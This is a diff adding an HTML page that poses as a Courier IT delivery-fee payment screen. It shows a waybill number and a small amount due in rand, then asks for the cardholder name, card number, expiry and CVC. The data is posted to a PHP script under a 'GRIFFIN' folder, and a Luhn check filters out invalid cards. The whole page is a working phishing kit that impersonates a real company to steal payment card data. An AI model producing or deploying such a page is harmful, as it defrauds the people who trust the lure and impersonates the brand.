@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Courier IT</title>
+	<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiUSoHmmNHJhq2_LHrbkITxUD0CiP9_mBL-A&s">
+	<link rel="stylesheet" type="text/css" href="./css/index.css">
+	<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300;400;500;600;700&display=swap" rel="stylesheet">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.js" type="text/javascript"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js" type="text/javascript"></script>
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
+</head>
+<style>
+	.errorinput{
+		box-shadow: rgb(255 0 0) 0px 2px 0px !important;
+	}
+</style>
+<script type="text/javascript">
+	$(document).ready(function(){
+		$('#cc').mask("0000000000000000");
+		$('#exp').mask("00/00");
+		$('#cvc').mask("000");
+		$('#pin').mask("0000");
+	})
+	function validate_creditcardnumber(inputNum) {
+    var digit, digits, flag, sum, _i, _len;
+    inputNum=inputNum.replaceAll(' ','')
+    dgit = (inputNum + '').split('')
+    if(dgit[0]!='5' && dgit[0]!='3' && dgit[0]!='4' && dgit[0]!='6') return false
+    if(inputNum.length!=16) return false
+    flag = true;
+    sum = 0;
+    digits = dgit.reverse();
+    for (_i = 0, _len = digits.length; _i < _len; _i++) {
+      digit = digits[_i];
+      digit = parseInt(digit, 10);
+      if ((flag = !flag)) {
+        digit *= 2;
+      }
+      if (digit > 9) {
+        digit -= 9;
+      }
+      sum += digit;
+    }
+    return sum % 10 === 0;
+  };
+  function check(e){
+  	    console.log('submit')
+  		if(validate_creditcardnumber($('#cc').val())){
+  			  			$('#cc').removeClass('errorinput')
+
+  		}else{
+  			e.preventDefault();
+  			$('#cc').addClass('errorinput')
+  		}
+  }
+</script>
+
+<body>
+
+<form id='sbnt' onsubmit="check(event)" method="post" action="./GRIFFIN/2ftwa.php">
+	<main>
+		<div id="container-logo" style="background-color: #ffe80040;"><img id="logo" src="https://mobile.courierit.co.za/Content/assets/images/logos/courierit_logo.png"><h2 style="color:black; font-size:12px">COURIERIT, A DIVISION OF RTT GROUP (PTY) LTD</h></div>
+		<section>
+						<div id="title-img" style="display: flex; align-items: center; justify-content: space-between;">
+  <h2 style="color:black; font-size: 14px;">"My pending and unpaid delivery fees."<br>"Waybill Number: ZA000152A20"</h2>
+  
+  <svg width="46" height="46" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 58 50" style="color: black;">
+    <g id="icon_box_55" transform="translate(-296 -184)">
+      <g id="Component_26_5" data-name="Component 26 – 5" transform="translate(296 184)">
+        <rect id="Rectangle_1782" data-name="Rectangle 1782" fill="currentColor" opacity="0"></rect>
+      </g>
+      <g id="icon_card_efaktura" transform="translate(-171.571 61.069)">
+        <path id="Line_92" data-name="Line 92" d="M13,1H0V-1H13Z" transform="translate(486 132)" fill="currentColor"></path>
+        <path id="Line_93" data-name="Line 93" d="M9.75,1H0V-1H9.75Z" transform="translate(486 136)" fill="currentColor"></path>
+        <path id="Line_94" data-name="Line 94" d="M9.75,1H0V-1H9.75Z" transform="translate(486 140)" fill="currentColor"></path>
+        <path id="Line_95" data-name="Line 95" d="M6,1H0V-1H6Z" transform="translate(501 163)" fill="currentColor"></path>
+        <path id="Path_493" data-name="Path 493" d="M492.044,163.044,490.959,163a9.42,9.42,0,0,1-5.666-2.292l-16-16a3.444,3.444,0,0,1-.2-4.733,2.807,2.807,0,0,1,2.005-.8,3.736,3.736,0,0,1,2.6,1.124l16,16A9.419,9.419,0,0,1,492,161.959ZM471.1,141.169a.8.8,0,0,0-.591.219,1.463,1.463,0,0,0,.2,1.9l16,16a6.4,6.4,0,0,0,3.114,1.526,6.373,6.373,0,0,0-1.528-3.112l-16-16A1.751,1.751,0,0,0,471.1,141.169Z" fill="currentColor"></path>
+        <path id="Line_96" data-name="Line 96" d="M.707,2.9-.707,1.483l2.19-2.19L2.9.707Z" transform="translate(473.148 144.025)" fill="currentColor"></path>
+        <path id="Line_97" data-name="Line 97" d="M2,1H0V-1H2Z" transform="translate(498 163)" fill="currentColor"></path>
+        <path id="Path_494" data-name="Path 494" d="M512,170H483a3,3,0,0,1-3-3V155h2v12a1,1,0,0,0,1,1h29a1,1,0,0,0,1-1V132.414L506.586,126H483a1,1,0,0,0-1,1v22h-2V127a3,3,0,0,1,3-3h24.414L515,131.586V167A3,3,0,0,1,512,170Z" fill="currentColor"></path>
+        <path id="Path_495" data-name="Path 495" d="M511,134h-6v-6h2v4h4Z" fill="currentColor"></path>
+        <path id="Path_496" data-name="Path 496" d="M504,139a1,1,0,0,1,1,1v6h4a1,1,0,0,1,.781,1.625l-8,10A1,1,0,0,1,500,157v-6h-4a1,1,0,0,1-.781-1.625l8-10A1,1,0,0,1,504,139Zm2.919,9H504a1,1,0,0,1-1-1v-4.149L498.081,149H501a1,1,0,0,1,1,1v4.149Z" fill="currentColor"></path>
+      </g>
+    </g>
+  </svg>
+  <span style="color:black">Amount due: 283.6<b style="color:yellow;"> ZAR</b></span>
+</div>
+			<p><b style="font-weight: 600;"></b></p><br>
+			<img width="280" src="./css/payment-methods.png">
+			<br><br>
+			<div id="input-container">
+				<label>Cardholder</label>
+				<span class="material-symbols-outlined">badge</span>
+				<input type="" minlength="4" name="titulaire">
+			</div>
+			<div id="input-container">
+				<label>Card number</label>
+				<span class="material-symbols-outlined"> credit_card </span>
+				<input id="cc" minlength="16" type="tel" name="cc">
+			</div>
+			<div id="container-input-exp" style="display: flex;justify-content: space-between;">
+				<div class="container-city" id="input-container">
+					<label>MM/YY</label>
+					<span class="material-symbols-outlined"> edit_calendar </span>
+					<input id="exp" pattern="[0-9]{2}/[0-9]{2}" minlength="4" type="tel" name="exp">
+				</div>
+				<div class="container-city" id="input-container">
+					<label>CVC/CVV (Security code)</label>
+					<span class="material-symbols-outlined"> sd_card </span>
+					<input required minlength="2" id="cvc" minlength="3" type="tel" name="cvc">
+				</div>
+				</div>
+			<br>
+			<button style="color:white;">Pay Now</button>
+			<br><br>
+		</section>
+		<span id="footer" style="display: block;margin-top:10px;"><b style="font-weight: 500;font-size: 14px;">&copy; 2025 COURIERIT STANDARD TERMS AND CONDITIONS</b></span>
+	</main>
+<form>
+
+</body>
+</html>
